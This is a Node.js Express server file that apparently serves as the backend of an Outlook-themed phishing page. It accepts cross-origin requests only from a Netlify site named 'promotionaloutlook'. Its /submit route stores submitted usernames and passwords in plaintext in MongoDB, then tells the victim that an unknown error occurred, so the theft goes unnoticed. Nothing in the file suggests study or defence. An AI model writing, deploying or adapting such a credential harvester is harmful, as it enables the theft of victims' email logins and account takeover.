import express from 'express';
import { connect, Schema, model } from 'mongoose';
import dotenv from 'dotenv';
import cors from 'cors';
import process from 'process';

dotenv.config();

// Initialize Express
const app = express();

// Middleware
app.use(express.json());
app.use(cors(
    {
        origin: 'https://promotionaloutlook.netlify.app',
    },
));

// Connect to MongoDB
connect(process.env.VITE_MONGODB_URI, {
    useNewUrlParser: true,
    useUnifiedTopology: true,
}).then(() => console.log('MongoDB connected'))
  .catch(err => console.error(err));

// Define Schema and Model
const userSchema = new Schema({
    username: String,
    password: String,
});

const User = model('User', userSchema);

// Handle POST request to save data
app.post('/submit', async (req, res) => {
    const { username, password } = req.body;
    if (!username || !password) {
        return res.status(400).json({ message: 'All fields are required' });
    }
    const user = new User({ username, password });
    try {
        await user.save();
        res.status(200).json({ message: 'An unknown error occured' });
    } catch (err) {
        res.status(500).json({ message: 'Error processing your data', error: err });
    }
});

// Start Server
const PORT = 5000;
app.listen(PORT, () => console.log(`Server running on http://localhost:${PORT}`));